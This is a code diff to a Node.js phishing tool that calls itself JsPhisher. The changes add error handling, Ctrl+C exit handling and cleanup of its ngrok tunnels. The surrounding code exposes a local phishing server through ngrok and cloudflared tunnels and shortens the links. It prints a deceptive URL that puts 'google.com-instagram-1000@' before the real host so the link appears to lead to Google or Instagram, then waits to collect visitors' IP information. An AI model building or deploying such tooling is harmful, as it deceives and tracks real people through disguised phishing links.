@@ -80,9 +80,9 @@ app.disable("x-powered-by");
 		})
 	);
 	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
-	const ngrok = await openNgrok(port);
+	const ngrok = await openNgrok(port).catch(console.error);
 	const shortNgrok = await short(ngrok).catch(console.error);
-	const cloudflared = !isTermux ? await openCloudflared(port) : null;
+	const cloudflared = !isTermux ? await openCloudflared(port).catch(console.error) : null;
 	const shortCf = !isTermux ? await short(cloudflared).catch(console.error) : null;
 	if (!isTermux) {
 		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
@@ -93,6 +93,11 @@ app.disable("x-powered-by");
 	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
 	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
+	if (process.platform === "win32")
+		require("readline")
+			.createInterface({ input: process.stdin, output: process.stdout })
+			.on("SIGINT", () => process.emit("SIGINT"));
+	process.on("SIGINT", onExit);
 })();
 
 app.all("/", async (req, res) => {
@@ -251,4 +256,11 @@ function openCloudflared(port) {
 			}
 		});
 	});
+}
+
+function onExit() {
+	console.log(chalk.yellowBright`\n${logInfo2} Thanks for using JsPhisher!\n`);
+	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line").catch(() => {});
+	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line%20%28http%29").catch(() => {});
+	process.exit();
 }
